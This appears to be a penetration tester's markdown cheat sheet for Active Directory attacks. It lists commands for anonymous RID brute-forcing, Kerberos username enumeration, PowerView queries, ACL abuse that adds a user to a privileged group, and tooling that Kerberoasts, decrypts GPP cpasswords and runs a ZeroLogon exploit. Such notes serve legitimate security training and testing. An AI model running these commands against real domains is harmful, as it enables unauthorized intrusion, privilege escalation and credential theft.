# On Linux - No Account
```bash
# netexec
nxc smb $ip -u anonymous/Guest -p "" --rid-brute 10000

# kerbrute - username enumeration
kerbrute -domain $domain -dc-ip $ip -users tools/payloads/SecLists/Usernames/xato-net-10-million-usernames.txt
```

# On Windows - With Domain Account
## Manual
```powershell
# List users of the domain
net user /domain

# Inspect an user
net user /domain

# List groups
net user /domain

# Inspect group
net group "Sales Department" /domain
```

- Script (script.ps1) to enumerate users and get their infos :
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

    Write-Host "-------------------------------"
}
```

## With Powerview
https://github.com/PowerShellMafia/PowerSploit/
```powershell
Import-Module .\PowerView.ps1

# Domain information
Get-NetDomain

# Querying users in the domain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon

# Querying groups in the domain
Get-NetGroup
Get-NetGroup | select cn
Get-NetGroup "Sales" | select member

# Querying computers in the domain
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# Scanning domain to find local administrative privileges for our user
Find-LocalAdminAccess

# Check Logged on users
Get-NetSession -ComputerName files04 -Verbose

# List the SPN accounts
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

### Objects permissions exploitation
- Most interesting objects permissions :
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

```powershell
Get-ObjectAcl -Identity stephanie

# Converting the ObjectISD into name
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104

# Converting the SecurityIdentifier into name
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553


# Checking what objects has GenericAll in the Management Department Group
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Convert the SIDs found into names
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

# Add ourselves to the Group
net group "Management Department" stephanie /add /domain
```

# Automatic tools
## AD Enum

* ASREPRoasting
* Kerberoasting
* Dump AD as BloodHound JSON files
* Searching GPOs in SYSVOL for cpassword and decrypting
* Run without credentials and attempt to gather for further enumeration during the run
* Sample exploits included:
  * **CVE-2020-1472**

https://github.com/CasperGN/ActiveDirectoryEnumeration

```bash
pip3 install ActiveDirectoryEnum
python -m ade

# query exploit for poc
python -m ade --exploit cve-2020-1472
```
